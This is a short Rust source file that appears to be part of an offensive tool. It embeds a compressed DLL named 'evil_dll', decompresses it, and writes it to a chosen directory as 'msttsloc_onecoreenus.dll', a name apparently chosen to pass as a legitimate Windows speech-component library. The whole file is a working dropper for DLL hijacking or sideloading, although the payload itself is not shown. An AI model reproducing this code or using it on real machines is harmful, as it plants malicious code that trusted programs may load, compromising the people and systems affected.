use std::fs::File;
use std::io::{self, Write};
use std::path::Path;
use zstd::stream::decode_all;

const DLL_BYTES: &[u8] = include_bytes!(concat!(env!("OUT_DIR"), "/evil_dll.dll.zst"));

pub fn write_binary(dir_path: &str) -> io::Result<()> {
    let decompressed = decode_all(DLL_BYTES)?;

    let full_path = Path::new(dir_path).join("msttsloc_onecoreenus.dll");

    let mut file = File::create(full_path)?;
    file.write_all(&decompressed)?;

    Ok(())
}